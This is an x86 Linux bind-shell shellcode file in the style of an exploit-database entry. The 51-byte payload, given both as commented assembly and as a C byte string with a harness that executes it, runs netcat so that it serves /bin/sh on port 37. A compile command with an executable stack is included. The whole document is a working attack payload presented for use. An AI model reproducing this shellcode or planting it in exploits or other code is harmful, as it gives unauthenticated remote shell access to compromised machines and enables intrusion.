/*
# Super_Small_Bind_Shell (x86)
# Date: 17.03.2017
# This shellcode will listen on port 37 and show you how deep the rabbit hole goes
# Please note that 37 port is below 1024 and thus privileged!
# Shellcode Author: ALEH BOITSAU
# Shellcode Length: 51 bytes ;)
# Tested on: Debian GNU/Linux 8/x86_64
# Command: gcc -m32 -z execstack super_small_bind_shell.c -o super_small_bind_shell

global _start
section .text
 _start:
    xor eax, eax
    push eax
    push 0x3733702d     ;-p37
    mov esi, esp

    push eax
    push 0x68732f2f     ;-le//bin//sh
    push 0x6e69622f
    push 0x2f656c2d
    mov edi, esp

    push eax
    push 0x636e2f2f     ;/bin//nc
    push 0x6e69622f
    mov ebx, esp

    push eax
    push esi
    push edi
    push ebx
    mov ecx, esp
    mov al,11
    int 0x80
*/

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] =
"\x31\xc0\x50\x68\x2d\x70\x33\x37\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x50\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80";
main()
{
	printf("Shellcode Length: %d\n",strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();
}
